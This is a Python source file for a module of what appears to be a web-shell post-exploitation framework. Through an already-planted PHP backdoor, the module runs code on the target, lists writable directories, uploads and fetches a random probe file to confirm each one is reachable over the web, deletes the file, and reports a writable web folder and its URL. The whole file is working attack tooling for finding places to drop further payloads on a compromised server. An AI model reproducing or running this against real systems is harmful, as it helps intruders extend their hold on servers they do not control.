'''
Created on 28/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P
from random import choice
from string import letters
from core.http.request import Request
from urlparse import urlparse

classname = 'Webdir'
    
class Webdir(Module):
    """
    TODO: the check if dir is writable is unnecessary, or 
    to move in file.check
    """
    

    params = ParametersList('Find a writable directory and corresponding URL',  [],
                    P(arg='rpath', help='Remote directory or \'find\' automatically', default='find', pos=0))
    
    
    def __init__( self, modhandler , url, password):
        
        self.probe_filename = ''.join(choice(letters) for i in xrange(4)) + '.html'

        self.found_url = None
        self.found_dir = None

        Module.__init__(self, modhandler, url, password)
        
    
    def __upload_file_content(self, content, rpath):
        self.modhandler.load('file.upload').set_file_content(content)
        self.modhandler.set_verbosity(6)
        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath })
        self.modhandler.set_verbosity()
        
        return response


    def __check_remote_test_file(self, file_path):
        
        return self.modhandler.load('file.check').run({'rpath' : file_path, 'mode' : 'exists'})


    def __check_remote_test_url(self, file_url):
        
        file_content = Request(file_url).read()
        
        if( file_content == '1'):
            return True
            

    def __remove_remote_test_file(self, file_path):
        
        if self.modhandler.load('shell.php').run( { 0 : "unlink('%s') && print('1');" % file_path }) != '1':
            self.mprint("[!] [find.webdir] Error cleaning test file %s" % (file_path))
                
                        
    def __enumerate_writable_dirs(self, root_dir):

        if not root_dir[-1]=='/': 
            root_dir += '/'
        
        try:
            writable_dirs_string = self.modhandler.load('find.perms').run({'qty' :  'any','type' : 'd', 'perm' : 'w', 'rpath' : root_dir })
            writable_dirs = [ d for d in writable_dirs_string.split('\n') if d]
        except ModuleException as e:
            self.mprint('[!] [' + e.module + '] ' + e.error)
            writable_dirs = []
            
        return writable_dirs
           
           
    def __check_writability(self, file_path, file_url):
        
        result = self.__upload_file_content('1', file_path) and self.__check_remote_test_file(file_path) and self.__check_remote_test_url(file_url)
        self.__remove_remote_test_file(file_path)
        return result        

    def run_module(self, path):
        
        
        # Every new call founds are deleted
        self.found_dir = None
        self.found_url = None
        
        start_path = None
        base_dir = None

        # Get base dir to remove it and get absolute path
        try:
            base_dir = self.modhandler.load('system.info').run({ 0 : 'document_root' })
        except ModuleException, e:
            self.mprint('[!] [' + e.module + '] ' + e.error)
        
        # Where to start to find (usually current dir)
        try:
            start_dir = self.modhandler.load('system.info').run({ 0 : 'basedir' })
        except ModuleException, e:
            self.mprint('[!] [' + e.module + '] ' + e.error)


        if path == 'find':
            start_path = start_dir
        else:
            start_path = path
        
        # Normalize start path
        try:
            start_path = self.modhandler.load('shell.php').run({ 0 : 'print(realpath("%s"));' % start_path })
        except ModuleException, e:
            self.mprint('[!] [' + e.module + '] ' + e.error)
            
        
        http_root = '%s://%s/' % (urlparse(self.url).scheme, urlparse(self.url).netloc) 
        
        if start_path and base_dir:
            
            writable_dirs = self.__enumerate_writable_dirs(start_path)
            writable_dirs.append(start_path)

            for dir_path in writable_dirs:

                if not dir_path[-1]=='/': 
                    dir_path += '/'
                
                file_path = dir_path + self.probe_filename
                file_url = http_root + file_path.replace(base_dir,'')
                dir_url = http_root + dir_path.replace(base_dir,'')
                   
                if self.__check_writability(file_path, file_url):
                    self.found_dir = dir_path
                    self.found_url = dir_url
                    
                
                if self.found_dir and self.found_url:
                   self.mprint("[find.webdir] Writable web folder: '%s' -> '%s'" % (self.found_dir, self.found_url))
                   return True
        
        raise ModuleException(self.name,  "Writable web directory not found")
